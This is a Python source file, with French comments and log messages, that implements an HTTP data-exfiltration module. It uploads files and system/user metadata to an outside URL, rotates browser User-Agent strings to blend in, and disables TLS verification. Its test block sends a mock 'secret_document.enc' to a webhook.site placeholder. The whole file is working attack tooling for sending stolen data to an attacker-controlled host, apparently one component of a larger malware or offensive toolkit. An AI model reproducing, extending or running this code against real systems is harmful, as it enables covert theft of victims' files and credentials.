import requests
import random
import time
import json
import os

class HTTPExfiltrator:
    def __init__(self, target_url: str, logger=None, timeout: int = 15):
        self.target_url = target_url
        self.logger = logger
        self.timeout = timeout
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
        ]
        if self.logger:
            self.logger.log_debug(f"[HTTPExfiltrator] Initialisé avec URL: {self.target_url}")

    def _log(self, level, message):
        if self.logger:
            getattr(self.logger, f"log_{level}")(f"[HTTPExfiltrator] {message}")
        else:
            print(f"[{level.upper()}] [HTTPExfiltrator] {message}")

    def exfiltrate(self, data: bytes, filename: str, metadata: dict = None) -> bool:
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }

        if metadata:
            try:
                headers["X-Metadata"] = json.dumps(metadata)
            except TypeError as e:
                self._log("warning", f"Impossible de sérialiser les métadonnées en JSON: {e}")

        self._log("info", f"Tentative d'exfiltration de '{filename}' vers {self.target_url}...")

        try:
            files_to_upload = {
                'file': (filename, data, 'application/octet-stream')
            }

            response = requests.post(
                self.target_url,
                files=files_to_upload,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )

            if response.status_code == 200:
                self._log("info", f"Exfiltration de '{filename}' réussie. Réponse du serveur: {response.text[:100]}...")
                return True
            else:
                self._log("error", f"Exfiltration de '{filename}' échouée. Statut: {response.status_code}, Réponse: {response.text[:200]}...")
                return False

        except requests.exceptions.Timeout:
            self._log("error", f"Timeout lors de l'exfiltration de '{filename}' vers {self.target_url}.")
            return False
        except requests.exceptions.ConnectionError as e:
            self._log("error", f"Erreur de connexion lors de l'exfiltration de '{filename}': {e}")
            return False
        except requests.exceptions.RequestException as e:
            self._log("error", f"Erreur de requête inattendue lors de l'exfiltration de '{filename}': {e}")
            return False
        except Exception as e:
            self._log("error", f"Erreur générique lors de l'exfiltration de '{filename}': {e}")
            return False

if __name__ == "__main__":
    print("[+] Test du module HTTPExfiltrator...")

    TEST_SERVER_URL = "https://webhook.site/YOUR_UNIQUE_URL_HERE"
    print(f"\n[!] Pour un test réel, configurez un serveur HTTP/HTTPS à l'adresse: {TEST_SERVER_URL}")
    print("[!] Vous pouvez utiliser https://webhook.site/ pour un test rapide.")
    print("[!] N'oubliez pas de remplacer 'YOUR_UNIQUE_URL_HERE' par votre URL réelle.")
    print("[!] Si vous utilisez un serveur local, lancez-le dans un autre terminal (ex: python3 -m http.server 8000).")

    test_data = b"This is some dummy data to exfiltrate. It would normally be encrypted and compressed."
    test_filename = "secret_document.enc"
    test_metadata = {"system_id": "test_machine_001", "user": "test_user"}

    exfiltrator = HTTPExfiltrator(TEST_SERVER_URL)

    print(f"\n[*] Tentative d'exfiltration de '{test_filename}' (longueur: {len(test_data)} bytes)...")
    success = exfiltrator.exfiltrate(test_data, test_filename, test_metadata)

    if success:
        print(f"[+] Exfiltration de '{test_filename}' rapportée comme réussie.")
        print("[+] Vérifiez le serveur cible (ou webhook.site) pour voir les données reçues.")
    else:
        print(f"[-] Exfiltration de '{test_filename}' rapportée comme échouée.")
        print("[-] Vérifiez la console pour les messages d'erreur détaillés.")

    print("\n[+] Tests du module HTTPExfiltrator terminés.")
    print("[!] N'oubliez pas que 'verify=False' est utilisé pour les tests et n'est PAS recommandé en production.")

